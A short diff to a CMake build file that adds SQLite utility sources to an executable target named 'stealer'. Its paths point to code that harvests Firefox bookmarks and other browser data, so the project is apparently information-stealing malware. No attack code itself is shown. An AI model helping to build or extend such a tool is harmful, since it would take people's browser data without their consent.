@@ -101,6 +101,8 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/browsers/firefox/impl/FBookmarks.h
         src/stealer/impl/browsers/entity/Entity.h
         src/stealer/impl/browsers/entity/Bookmark.h
+        src/utils/SQLiteUtil.cpp
+        src/utils/SQLiteUtil.h
 )
 
 target_link_libraries(stealer
